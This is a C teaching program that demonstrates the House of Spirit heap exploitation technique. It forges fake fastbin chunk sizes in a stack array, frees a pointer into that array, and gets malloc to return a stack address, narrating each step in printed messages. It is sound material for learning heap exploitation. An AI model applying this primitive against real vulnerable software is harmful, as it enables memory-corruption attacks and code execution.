#include <stdio.h>
#include <stdlib.h>

int main(void)
{
	puts("So we will be covering a House of Spirit Attack.");
	puts("A House of Spirit Attack allows us to get malloc to return a fake chunk to a region we have some control over (such as the bss or stack).");
	puts("In order for this attack to work and pass all of the malloc checks, we will need to make two fake chunks.");
	puts("To setup the fake chunks, we will need to write fake size values for the chunks.");
	puts("Also the first fake chunk is where we will want our chunk returned by malloc to be.");
	puts("Let's get started!\n");


	unsigned long array[20];
	printf("So we start off by initializing our array on the stack.\n");
	printf("Array Start: %p\n", array);
	printf("Our goal will be to allocate a chunk at %p\n\n", &array[2]);


	printf("Now we need to write our two size values for the chunks.\n");
	printf("There are three restrictions we have to meet.\n\n");

	printf("0.) Size of the chunks must be within the fast bin range.\n");
	printf("1.) The size values must be placed where they should if they were an actual chunk.\n");
	printf("2.) The size of the first heap chunk (the one that gets freed and reallocated) must be the same as the rounded up heap size of the malloc that we want to allocate our fake chunk.\n");
	printf("That should be larger than the argument passed to malloc.\n\n");

	printf("Also as a side note, the two sizes don't have to be equal.\n");
	printf("Check the code comments for how the fake heap chunks are structured.\n");
	printf("With that, let's write our two size values.\n\n");

	/*
	this will be the structure of our two fake chunks:
	assuming that you compiled it for x64

	+-------+---------------------+------+
	| 0x00: | Chunk # 0 prev size | 0x00 |
	+-------+---------------------+------+
	| 0x08: | Chunk # 0 size      | 0x60 |
	+-------+---------------------+------+
	| 0x10: | Chunk # 0 content   | 0x00 |
	+-------+---------------------+------+
	| 0x60: | Chunk # 1 prev size | 0x00 |
	+-------+---------------------+------+
	| 0x68: | Chunk # 1 size      | 0x40 |
	+-------+---------------------+------+
	| 0x70: | Chunk # 1 content   | 0x00 |
	+-------+---------------------+------+

	for what we are doing the prev size values don't matter too much
	the important thing is the size values of the heap headers for our fake chunks
	*/

	array[1] = 0x60;
	array[13] = 0x40;

	printf("Now that we setup our fake chunks set up, we will now get a pointer to our first fake chunk.\n");
	printf("This will be the ptr that we get malloc to return for this attack\n");

	unsigned long *ptr;
	ptr = &(array[2]);

	printf("Address: %p\n\n", ptr);

	printf("Now we will free the pointer to place it into the fast bin.\n");

	free(ptr);

	printf("Now we can just allocate a chunk that it's rounded up malloc size will be equal to that of our fake chunk (0x60), and we should get malloc to return a pointer to array[1].\n\n");

	unsigned long *target;
	target = malloc(0x50);

	printf("returned pointer: %p\n", target);

}
